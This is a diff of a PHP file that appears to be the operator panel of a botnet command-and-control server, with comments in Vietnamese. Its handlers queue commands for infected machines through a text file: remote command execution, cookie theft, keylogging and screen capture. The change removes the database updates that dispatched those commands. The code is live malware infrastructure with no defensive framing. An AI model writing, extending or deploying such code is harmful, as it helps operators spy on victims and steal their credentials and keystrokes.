@@ -74,11 +74,6 @@ if (isset($_POST['buttonCmd'])) {
     if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
         $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
         echo 'Received: ' . $cmdstr . '<br>';
-        $query = "UPDATE botes SET command='getcmd' WHERE ip=? AND port=?";
-        $stmt = $db->prepare($query);
-        $stmt->bind_param('ss', $ip, $port);
-        $stmt->execute();
-        $db->close();
         $fp = fopen('commandBot.txt', 'w');
         fwrite($fp, "getcmd");
         fwrite($fp, '&');
@@ -91,11 +86,6 @@ if (isset($_POST['buttonCmd'])) {
     if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
         $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
         echo 'Received: ' . $cmdstr . '<br>';
-        $query = "UPDATE botes SET command='getcookie' WHERE ip=? AND port=?";
-        $stmt = $db->prepare($query);
-        $stmt->bind_param('ss', $ip, $port);
-        $stmt->execute();
-        $db->close();
         $fp = fopen('commandBot.txt', 'w');
         fwrite($fp, "getcookie");
         fwrite($fp, '&');
@@ -108,11 +98,6 @@ if (isset($_POST['buttonCmd'])) {
     if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
         $cmdstr = $_POST['cmdstr'];
         echo 'Received: ' . $cmdstr . '<br>';
-        $query = "UPDATE botes SET command='getkeylogger' WHERE ip=? AND port=?";
-        $stmt = $db->prepare($query);
-        $stmt->bind_param('ss', $ip, $port);
-        $stmt->execute();
-        $db->close();
         $fp = fopen('commandBot.txt', 'w');
         fwrite($fp, "getkeylogger");
         fwrite($fp, '&');
@@ -125,11 +110,6 @@ if (isset($_POST['buttonCmd'])) {
     if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
         $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
         echo 'Received: ' . $cmdstr . '<br>';
-        $query = "UPDATE botes SET command='getcapture' WHERE ip=? AND port=?";
-        $stmt = $db->prepare($query);
-        $stmt->bind_param('ss', $ip, $port);
-        $stmt->execute();
-        $db->close();
         $fp = fopen('commandBot.txt', 'w');
         fwrite($fp, "getcapture");
         fwrite($fp, '&');
